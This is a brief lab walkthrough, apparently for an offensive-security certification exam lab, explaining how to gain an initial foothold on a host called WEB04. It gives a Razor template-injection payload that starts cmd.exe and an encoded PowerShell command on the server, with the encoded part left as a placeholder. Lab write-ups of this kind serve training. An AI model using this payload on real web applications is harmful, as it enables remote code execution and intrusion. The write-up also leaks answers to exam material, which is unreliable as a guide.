# Alternative initial foothold on WEB04

Add the hostname to your Kali (you cannot access via IP):
`sudo echo "192.168.X.200	web04.cowmotors.com" >> /etc/hosts`

Access the webapp on HTTPS port (not HTTP), you will end up on OrangeSurvey at https://web04.cowmotors.com

The survey is vulnerable to Razor SSTI (try all fields), the payload is (without the ` for Markdown formatting)  
`@System.Diagnostics.Process.Start("cmd.exe","/c powershell -e ENCODEDCOMMAND");`

For the payload, use my guide [[LINK ONLY AVAILABLE IN PAID GUIDE, BECAUSE SHARED WITH OTHER EXAM SETS]] to know how to encode and test properly the payload.
